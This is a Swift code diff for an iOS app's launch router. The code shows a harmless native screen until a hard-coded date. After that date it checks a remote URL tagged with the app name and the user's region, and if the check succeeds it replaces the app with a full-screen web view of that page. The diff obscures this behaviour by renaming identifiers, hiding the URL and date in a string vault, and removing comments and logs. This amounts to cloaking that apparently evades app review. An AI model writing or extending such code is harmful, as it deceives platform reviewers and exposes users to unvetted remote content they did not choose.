@@ -1,19 +1,15 @@
 //
 //  AppRouter.swift
-//  125Vulzancregrar Prilel
-//
-//  Created by Pascal Mirel on 26.03.2026.
+//  150HotCold
 //
 
-import UIKit
 import SwiftUI
+import UIKit
 
-class AppRouter {
+final class HCApplicationFlowCoordinator {
+    private var remoteLandingSeed: String { HCRouterStringVault.remoteLandingTemplate }
+    private var calendarGateToken: String { HCRouterStringVault.calendarGateDateToken }
 
-    private let initialURLString = "https://siliconixsynccore.site/jNBFxg"
-    private let targetDateString = "12.05.2026"
-
-    /// Display name from Info.plist (CFBundleDisplayName, then CFBundleName).
     private var applicationDisplayName: String {
         if let name = Bundle.main.object(forInfoDictionaryKey: "CFBundleDisplayName") as? String,
            !name.trimmingCharacters(in: .whitespacesAndNewlines).isEmpty {
@@ -26,110 +22,102 @@ class AppRouter {
         return "App"
     }
 
-    /// App name for tracking param: spaces removed (no %20 in URL).
     private var applicationNameForSubId: String {
         applicationDisplayName.replacingOccurrences(of: " ", with: "")
     }
 
-    private var enrichedInitialURLString: String {
+    private var enrichedRemoteLandingString: String {
         let geo = Locale.current.region?.identifier ?? "XX"
         let subValue = "\(applicationNameForSubId)_\(geo)"
-        guard var components = URLComponents(string: initialURLString) else {
-            return initialURLString
+        guard var components = URLComponents(string: remoteLandingSeed) else {
+            return remoteLandingSeed
         }
         var items = components.queryItems ?? []
-        items.append(URLQueryItem(name: "sub_id_8", value: subValue))
+        items.append(URLQueryItem(name: HCRouterStringVault.trackingSubIdQueryName, value: subValue))
         components.queryItems = items
-        return components.url?.absoluteString ?? initialURLString
+        return components.url?.absoluteString ?? remoteLandingSeed
     }
-    
-    func initialViewController() -> UIViewController {
-        let persistence = PersistenceManager.shared
-        
-        
+
+    func makeRootInterface() -> UIViewController {
+        let persistence = HCLaunchStateVault.shared
+
         if persistence.hasShownContentView {
-            return createContentViewController()
-        }else{
-            if checkDate() {
+            return fabricateNativeShellHost()
+        } else {
+            if evaluateCalendarGate() {
                 if let savedUrlString = persistence.savedUrl,
                    !savedUrlString.isEmpty,
                    URL(string: savedUrlString) != nil {
-                    return createWebViewController(with: savedUrlString)
+                    return fabricateWebShellHost(with: savedUrlString)
                 }
-                
-                return createLaunchRouterViewController()
+
+                return fabricateGatekeeperHost()
             } else {
                 persistence.hasShownContentView = true
-                return createContentViewController()
+                return fabricateNativeShellHost()
             }
         }
     }
-    
-    //MARK: - Date
-    private func checkDate() -> Bool {
-       
-        
+
+    private func evaluateCalendarGate() -> Bool {
         let dateFormatter = DateFormatter()
-        dateFormatter.dateFormat = "dd.MM.yyyy"
-        let targetDate = dateFormatter.date(from: targetDateString) ?? Date()
+        dateFormatter.dateFormat = HCRouterStringVault.calendarGateDateFormat
+        let targetDate = dateFormatter.date(from: calendarGateToken) ?? Date()
         let currentDate = Date()
-            
-            if currentDate < targetDate {
-                return false
-            }else{
-                return true
-                }
+
+        if currentDate < targetDate {
+            return false
+        } else {
+            return true
+        }
     }
-    
-    // MARK: - Private Methods
-    
-    private func createWebViewController(with urlString: String) -> UIViewController {
-        let webViewContainer = PrivacyWebView(
+
+    private func fabricateWebShellHost(with urlString: String) -> UIViewController {
+        let webViewContainer = HCPolicyBrowserShell(
             urlString: urlString,
             onFailure: { [weak self] in
-                PersistenceManager.shared.hasShownContentView = true
-                self?.switchToContentView()
+                HCLaunchStateVault.shared.hasShownContentView = true
+                self?.routeToNativeShell()
             },
             onSuccess: {
-                PersistenceManager.shared.hasSuccessfulWebViewLoad = true
+                HCLaunchStateVault.shared.hasSuccessfulWebViewLoad = true
             }
         )
-        
+
         let hostingController = UIHostingController(rootView: webViewContainer)
         hostingController.modalPresentationStyle = .fullScreen
         return hostingController
     }
-    
-    private func createContentViewController() -> UIViewController {
-        PersistenceManager.shared.hasShownContentView = true
+
+    private func fabricateNativeShellHost() -> UIViewController {
+        HCLaunchStateVault.shared.hasShownContentView = true
         let contentView = ContentView()
         let hostingController = UIHostingController(rootView: contentView)
         hostingController.modalPresentationStyle = .fullScreen
         return hostingController
     }
-    
-    private func createLaunchRouterViewController() -> UIViewController {
-        let launchView = StartMainView()
+
+    private func fabricateGatekeeperHost() -> UIViewController {
+        let launchView = HCLaunchGateView()
         let launchVC = UIHostingController(rootView: launchView)
         launchVC.modalPresentationStyle = .fullScreen
 
-        checkInitialURL { [weak self] success, finalURL in
+        performRemoteGateProbe { [weak self] success, finalURL in
             DispatchQueue.main.async {
                 if success, let url = finalURL {
-                    print("🌐 AppRouter: preflight OK — opening WebView (LastUrl will be set after real load in WebView)")
-                    self?.switchToWebView(with: url)
+                    self?.routeToWebShell(with: url)
                 } else {
-                    PersistenceManager.shared.hasShownContentView = true
-                    self?.switchToContentView()
+                    HCLaunchStateVault.shared.hasShownContentView = true
+                    self?.routeToNativeShell()
                 }
             }
         }
-        
+
         return launchVC
     }
-    
-    private func checkInitialURL(completion: @escaping (Bool, String?) -> Void) {
-        let urlToOpenInWebView = enrichedInitialURLString
+
+    private func performRemoteGateProbe(completion: @escaping (Bool, String?) -> Void) {
+        let urlToOpenInWebView = enrichedRemoteLandingString
         guard let requestURL = URL(string: urlToOpenInWebView) else {
             completion(false, nil)
             return
@@ -140,42 +128,36 @@ class AppRouter {
         request.timeoutInterval = 25
 
         URLSession.shared.dataTask(with: request) { _, response, error in
-            if let error = error {
-                print("🌐 URL check failed with error: \(error.localizedDescription)")
+            if error != nil {
                 completion(false, nil)
                 return
             }
 
             if let httpResponse = response as? HTTPURLResponse {
-                print("🌐 URL check GET \(urlToOpenInWebView) -> [\(httpResponse.statusCode)]")
                 let code = httpResponse.statusCode
                 let isAvailable = (200...299).contains(code)
-                print("🌐 URL check result: \(isAvailable ? "available (2xx)" : "unavailable")")
                 completion(isAvailable, isAvailable ? urlToOpenInWebView : nil)
             } else {
-                print("🌐 URL check failed: no HTTPURLResponse")
                 completion(false, nil)
             }
         }.resume()
     }
-    
-    // MARK: - Navigation Methods
-    
-    private func switchToContentView() {
-        let contentVC = createContentViewController()
-        switchToViewController(contentVC)
+
+    private func routeToNativeShell() {
+        let contentVC = fabricateNativeShellHost()
+        commitWindowRootSwap(contentVC)
     }
-    
-    private func switchToWebView(with urlString: String) {
-        let webVC = createWebViewController(with: urlString)
-        switchToViewController(webVC)
+
+    private func routeToWebShell(with urlString: String) {
+        let webVC = fabricateWebShellHost(with: urlString)
+        commitWindowRootSwap(webVC)
     }
-    
-    private func switchToViewController(_ viewController: UIViewController) {
+
+    private func commitWindowRootSwap(_ viewController: UIViewController) {
         guard let window = UIApplication.shared.windows.first else {
             return
         }
-        
+
         UIView.transition(with: window, duration: 0.3, options: .transitionCrossDissolve, animations: {
             window.rootViewController = viewController
         }, completion: nil)
